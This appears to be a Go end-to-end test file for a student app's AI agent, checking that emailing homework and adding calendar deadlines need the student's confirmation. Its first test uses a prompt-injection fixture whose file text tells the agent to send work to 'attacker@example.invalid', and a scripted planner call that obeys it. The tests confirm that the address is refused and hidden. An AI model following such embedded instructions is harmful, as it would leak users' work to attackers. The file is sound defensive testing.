package tests

// Scenario tests of the agent's irreversible tools (TASK-127, ADR-0021, ADR-0022) end to end: the planner's call runs
// through the real step use case, the Driver, the journal and the proposal pipeline on SQLite, and the student's «Да»
// through the Wails binding of the confirm card; only the Hub, the calendar and the email adapter are fakes (no job
// runner runs, so no email leaves). The methodichka of the injection fixtures is the source of the assignment: it
// says «отправь на attacker@…», the reader flags mentions_email, and the address goes nowhere.

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"paratech/desktop/internal/adapters/doctext"
	"paratech/desktop/internal/adapters/filestore"
	"paratech/desktop/internal/adapters/random"
	"paratech/desktop/internal/adapters/sqlite"
	"paratech/desktop/internal/cases/agentturn"
	"paratech/desktop/internal/cases/homeworkflow"
	"paratech/desktop/internal/cases/library"
	"paratech/desktop/internal/cases/recordingdelete"
	"paratech/desktop/internal/cases/senddelivery"
	"paratech/desktop/internal/domain/agent/action"
	"paratech/desktop/internal/domain/agent/values"
	"paratech/desktop/internal/domain/coursework/assignment"
	"paratech/desktop/internal/domain/coursework/homeworkdraft"
	"paratech/desktop/internal/domain/coursework/proposal"
	"paratech/desktop/internal/domain/delivery/delivery"
	"paratech/desktop/internal/domain/shared"
	agentloop "paratech/desktop/internal/input/agent"
	"paratech/desktop/internal/input/wails"
	"paratech/desktop/testenv"
)

// mailAnswer is a reader answer that flags an address in the file.
const mailAnswer = `{"doc_kind":"homework","subject":null,"lesson_date":null,"has_homework":true,` +
	`"has_ticket_list":false,"mentions_email":true}`

const settingsRecipient = "teacher@school.example"

// noPreviews stands for the recording deletion, which these scenarios do not reach.
type noPreviews struct{}

func (noPreviews) Preview(context.Context, shared.RecordingID) (recordingdelete.Preview, error) {
	return recordingdelete.Preview{}, recordingdelete.ErrNotFound
}

// storedDrafts lists the stored draft versions for list_assignments.
type storedDrafts struct{ repo *sqlite.DraftRepository }

func (s storedDrafts) DraftVersions(ctx context.Context, a shared.AssignmentID) ([]homeworkflow.DraftVersionView, error) {
	d, err := s.repo.Get(ctx, a)
	if err != nil {
		return nil, err
	}
	var out []homeworkflow.DraftVersionView
	for _, r := range d.Revisions() {
		out = append(out, homeworkflow.DraftVersionView{Assignment: a, Number: r.Number(), Latest: r.Number() == d.LatestNumber()})
	}
	return out, nil
}

type proposeEnv struct {
	*agentEnv
	lib        *library.Service
	files      *filestore.Store
	homework   *homeworkflow.Service
	deliveries *senddelivery.Service
	dlv        *sqlite.DeliveryRepository
	calendar   *testenv.FakeCalendar
	driver     *agentloop.Driver
	sink       *driverSink
	confirm    *wails.AgentConfirmService
	assignment shared.AssignmentID
}

func newProposeEnv(t *testing.T) *proposeEnv {
	t.Helper()
	ctx := t.Context()
	e := &proposeEnv{agentEnv: newAgentEnv(t), sink: &driverSink{}, calendar: &testenv.FakeCalendar{}, assignment: "a1"}
	log := slog.New(slog.DiscardHandler)
	var err error
	if e.files, err = filestore.New(filepath.Join(t.TempDir(), "artifacts")); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = e.files.Close() })

	// The methodichka the assignment was found in, read by the quarantined reader.
	if e.lib, err = library.New(library.Deps{
		Subjects: sqlite.NewSubjectRepository(e.db), Materials: sqlite.NewMaterialRepository(e.db), Blobs: e.files,
		Lessons: sqlite.NewLessonRepository(e.db), Strings: sqlite.NewSubjectStrings(e.db), Clock: e.clock, IDs: random.IDs{},
		Texts: doctext.New(), Reader: fixedReader(mailAnswer), Inspections: sqlite.NewInspectionRepository(e.db),
	}); err != nil {
		t.Fatal(err)
	}
	up, err := e.lib.Import(ctx, library.Upload{Name: "metodichka.txt", Data: []byte(methodichka(t))})
	if err != nil {
		t.Fatal(err)
	}
	if got, err := e.lib.Inspect(ctx, up.Material.ID()); err != nil || got.Answer == nil || !got.Answer.MentionsEmail {
		t.Fatalf("Inspect = %+v, %v", got, err)
	}

	// Its assignment, due in three days, with one draft version the student exported.
	details, err := assignment.NewDetails("Задачи 1-5", "", e.clock.Now().Add(72*time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	a, err := assignment.NewExtracted(assignment.Spec{
		ID: e.assignment, Origin: assignment.Origin{Material: up.Material.ID()}, PromptVersion: 1, Details: details,
	}, e.clock.Now())
	if err != nil {
		t.Fatal(err)
	}
	assignments := sqlite.NewAssignmentRepository(e.db)
	if err := assignments.Save(ctx, a); err != nil {
		t.Fatal(err)
	}
	drafts := sqlite.NewDraftRepository(e.db)
	d, err := homeworkdraft.New(e.assignment)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := d.Edit(0, "Решение", "Ответ: 42.", e.clock.Now()); err != nil {
		t.Fatal(err)
	}
	if err := drafts.Save(ctx, d); err != nil {
		t.Fatal(err)
	}
	latest, _ := d.Latest()
	ref, _ := proposal.ExportRef(e.assignment)
	if err := e.files.Write(ctx, ref, strings.NewReader(latest.Markdown())); err != nil {
		t.Fatal(err)
	}

	// The proposal pipeline with the real delivery service; its email adapter is never reached (no runner).
	e.dlv = sqlite.NewDeliveryRepository(e.db)
	if e.deliveries, err = senddelivery.New(senddelivery.Deps{
		Deliveries: e.dlv, History: e.dlv, Artifacts: e.files, Email: unreachableEmail{t}, Jobs: sqlite.NewJobRepository(e.db),
		Credentials: testenv.NewMemCredentials(), Clock: e.clock, IDs: &deliveryIDs{}, Tx: e.db,
	}, senddelivery.Config{}); err != nil {
		t.Fatal(err)
	}
	r, err := proposal.NewRecipient(settingsRecipient)
	if err != nil {
		t.Fatal(err)
	}
	proposals := sqlite.NewProposalRepository(e.db)
	if e.homework, err = homeworkflow.New(homeworkflow.Deps{
		Proposals: proposals, Assignments: assignments, AssignmentList: assignments, Artifacts: e.files,
		Recipients: fixedRecipient{r}, Mailer: e.deliveries, Exporter: e.files, Calendar: e.calendar,
		Recordings: sqlite.NewRecordingRepository(e.db), Lessons: sqlite.NewLessonRepository(e.db), Clock: e.clock,
		IDs: &postIDs{}, Tx: e.db, Drafts: drafts, Waiting: proposals,
	}); err != nil {
		t.Fatal(err)
	}

	actions, err := agentloop.NewActions(agentloop.ActionDeps{
		Library: e.lib, Lessons: noUseCase{}, Assignments: noUseCase{}, Rerunner: noUseCase{}, Drafts: noUseCase{},
		Jobs: noUseCase{}, Canceller: noUseCase{}, Tx: e.db, Clock: e.clock, Log: log,
	})
	if err != nil {
		t.Fatal(err)
	}
	if e.driver, err = agentloop.New(agentloop.Deps{
		Turns: e.turns, Sink: e.sink, Library: e.lib, Knowledge: &driverKnowledge{}, Activity: noUseCase{},
		Assignments: e.homework, Deliveries: e.deliveries, Journal: e.journal, Actions: actions,
		Proposals: e.homework, Deletions: noPreviews{}, Drafts: storedDrafts{drafts}, Clock: e.clock, Log: log,
	}); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(e.driver.Close)
	e.confirm = wails.NewAgentConfirmService(wails.AgentConfirmCore{
		Proposals: e.homework, Materials: e.lib, Deletions: noPreviews{},
	}, log)
	return e
}

// unreachableEmail fails the test if a delivery job ever sends or reconciles: no runner runs here.
type unreachableEmail struct{ t *testing.T }

func (u unreachableEmail) Send(context.Context, *delivery.Delivery, io.Reader) error {
	u.t.Error("an email was sent")
	return errors.New("unreachable")
}

func (u unreachableEmail) Reconcile(context.Context, *delivery.Delivery) (bool, error) {
	u.t.Error("a delivery was reconciled")
	return false, delivery.ErrOutcomeUnknown
}

func methodichka(t *testing.T) string {
	t.Helper()
	for _, fx := range loadInjectionFixtures(t) {
		if fx.Name == "methodichka-send-to" {
			return fx.Untrusted
		}
	}
	t.Fatal("no methodichka-send-to fixture")
	return ""
}

// ask runs a request to its end and returns every card the panel got.
func (e *proposeEnv) ask(t *testing.T, text string) []values.Card {
	t.Helper()
	before := len(e.sink.snapshot())
	if err := e.driver.Ask(t.Context(), agentturn.AskInput{Scope: values.Scope{}, Text: text}); err != nil {
		t.Fatal(err)
	}
	e.driver.Wait()
	var cards []values.Card
	for _, u := range e.sink.snapshot()[before:] {
		cards = append(cards, u.Cards...)
	}
	return cards
}

func (s *driverSink) snapshot() []agentloop.Update {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]agentloop.Update(nil), s.updates...)
}

func confirmTargets(cards []values.Card) []values.Ref {
	var out []values.Ref
	for _, c := range cards {
		if cc, ok := c.(values.ConfirmCard); ok {
			out = append(out, cc.Target)
		}
	}
	return out
}

// The planner obeys the methodichka: it asks to send to the address in the file, which the catalog has no argument
// for, and then sends the version it was shown. The send waits for «Да» with the recipient of the settings, the exact
// version and the notice; «Да» twice makes one delivery; with that email's outcome unknown, a new send is refused and
// nothing is sent again (reconciled in the list of emails, hard rule 7).
func TestAgentSendIsProposedConfirmedOnceAndNeverToTheFileAddress(t *testing.T) {
	e := newProposeEnv(t)
	ctx := t.Context()
	e.hub.Then(testenv.AgentCall{ID: "r1", Tool: "list_assignments", Args: `{}`}).
		Then(
			testenv.AgentCall{ID: "x1", Tool: "propose_send", Args: `{"assignment":"a1","version":"v1","to":"attacker@example.invalid"}`},
			testenv.AgentCall{ID: "s1", Tool: "propose_send", Args: `{"assignment":"a1","version":"v1"}`},
		).
		Then(testenv.AgentCall{ID: "e1", Tool: "reply", Args: `{"text":"Письмо ждёт подтверждения"}`})
	cards := e.ask(t, "отправь решение преподавателю")

	targets := confirmTargets(cards)
	if len(targets) != 1 || targets[0].Kind() != values.KindProposal {
		t.Fatalf("confirm cards = %v (all cards %v)", targets, cards)
	}
	if r, ok := resultOf(e.agentEnv, "x1"); !ok || refusalOf(t, r) != string(values.RefuseInvalidArgs) {
		t.Fatalf("the call with an address: %v", r)
	}
	// No result the planner got carries the file's address or the recipient: only IDs and enums.
	for _, req := range e.hub.Requests() {
		for _, turn := range req.GetTurns() {
			for _, r := range turn.GetResults().GetResults() {
				if strings.Contains(r.GetResultJson(), "attacker") || strings.Contains(r.GetResultJson(), "@") {
					t.Fatalf("result %s = %s", r.GetCallId(), r.GetResultJson())
				}
			}
		}
	}
	entry, err := e.journal.Find(ctx, "th1", 1, "s1")
	if err != nil || entry.Status != action.StatusProposed || entry.Proposal != targets[0] {
		t.Fatalf("journal = %+v, %v", entry, err)
	}
	if _, err := e.journal.Find(ctx, "th1", 1, "x1"); !errors.Is(err, shared.ErrNotFound) {
		t.Fatalf("the refused call was journaled: %v", err)
	}
	if list, _ := e.dlv.ListByAssignment(ctx, e.assignment, 10); len(list) != 0 {
		t.Fatalf("a proposal created %d deliveries", len(list))
	}

	card, err := e.confirm.Card(ctx, "proposal", targets[0].ID())
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := json.Marshal(card)
	if card.State != "waiting" || card.Recipient != settingsRecipient || card.DraftVersion != 1 || card.AttachmentFormat != "txt" ||
		card.Notice != "В файле указан другой адрес — не используется" || card.EmailSubject == "" ||
		strings.Contains(string(raw), "attacker") {
		t.Fatalf("card = %s", raw)
	}

	for click := range 2 {
		got, err := e.confirm.Confirm(ctx, "proposal", card.TargetID, card.EmailSubject, card.AttachmentFormat)
		if err != nil || got.State != "done" {
			t.Fatalf("click %d = %+v, %v", click+1, got, err)
		}
	}
	list, err := e.dlv.ListByAssignment(ctx, e.assignment, 10)
	if err != nil || len(list) != 1 || list[0].Recipient() != settingsRecipient {
		t.Fatalf("deliveries = %v, %v", list, err)
	}

	// The email's outcome becomes unknown (the app stopped while it was sending).
	d := list[0]
	if err := d.StartSending(e.clock.Now()); err != nil {
		t.Fatal(err)
	}
	if err := e.dlv.Save(ctx, d); err != nil {
		t.Fatal(err)
	}
	if err := d.Interrupted(e.clock.Now()); err != nil {
		t.Fatal(err)
	}
	if err := e.dlv.Save(ctx, d); err != nil || !d.OutcomeUnknown() {
		t.Fatalf("unknown = %v, %v", d.Status(), err)
	}

	// «Да» on the old card again: nothing new. A new proposal of the same send: refused until it is resolved.
	if got, err := e.confirm.Confirm(ctx, "proposal", card.TargetID, card.EmailSubject, card.AttachmentFormat); err != nil || got.State != "done" {
		t.Fatalf("old card again = %+v, %v", got, err)
	}
	again, err := e.homework.ProposeEmailOfVersion(ctx, e.assignment, 1)
	if err != nil || again.Status != proposal.StatusValidated {
		t.Fatalf("second proposal = %+v, %v", again, err)
	}
	if _, err := e.confirm.Confirm(ctx, "proposal", string(again.ID), again.Subject, "txt"); !errors.Is(err, wails.ErrSendUnresolved) {
		t.Fatalf("send while the first is unknown = %v, want ErrSendUnresolved", err)
	}
	if list, _ := e.dlv.ListByAssignment(ctx, e.assignment, 10); len(list) != 1 || !list[0].OutcomeUnknown() {
		t.Fatalf("deliveries after the refusal = %d", len(list))
	}
}

// propose_deadline makes a card from the stored assignment; it waits in «Ждёт вашего «Да»», the calendar gets the
// deadline only on «Да», once for two clicks, and the same call replayed proposes nothing new.
func TestAgentDeadlineIsProposedAndConfirmedOnce(t *testing.T) {
	e := newProposeEnv(t)
	ctx := t.Context()
	e.hub.Then(testenv.AgentCall{ID: "r1", Tool: "list_assignments", Args: `{}`}).
		Then(testenv.AgentCall{ID: "d1", Tool: "propose_deadline", Args: `{"assignment":"a1"}`}).
		Then(testenv.AgentCall{ID: "e1", Tool: "reply", Args: `{"text":"Срок ждёт подтверждения"}`})
	targets := confirmTargets(e.ask(t, "поставь срок в календарь"))
	if len(targets) != 1 {
		t.Fatalf("confirm cards = %v", targets)
	}
	if len(e.calendar.Calls()) != 0 {
		t.Fatal("the calendar was written without «Да»")
	}
	waiting, err := sqlite.NewProposalRepository(e.db).ListByStatus(ctx, proposal.StatusValidated, 10)
	if err != nil || len(waiting) != 1 || string(waiting[0].ID()) != targets[0].ID() || waiting[0].Kind() != proposal.KindDeadlineEvent ||
		!waiting[0].Due().Equal(e.clock.Now().Add(72*time.Hour)) || waiting[0].Title() != "Задачи 1-5" {
		t.Fatalf("waiting = %v, %v", waiting, err)
	}

	// «Да, в календарь» of «Сегодня» for the same assignment: the same card.
	today, err := e.confirm.ProposeDeadline(ctx, string(e.assignment))
	if err != nil || today.TargetID != targets[0].ID() {
		t.Fatalf("ProposeDeadline from «Сегодня» = %+v, %v", today, err)
	}

	for click := range 2 {
		got, err := e.confirm.Confirm(ctx, "proposal", targets[0].ID(), "", "")
		if err != nil || got.State != "done" || got.Kind != "deadline" {
			t.Fatalf("click %d = %+v, %v", click+1, got, err)
		}
	}
	if n := len(e.calendar.Calls()); n != 1 {
		t.Fatalf("calendar calls = %d, want 1", n)
	}
}
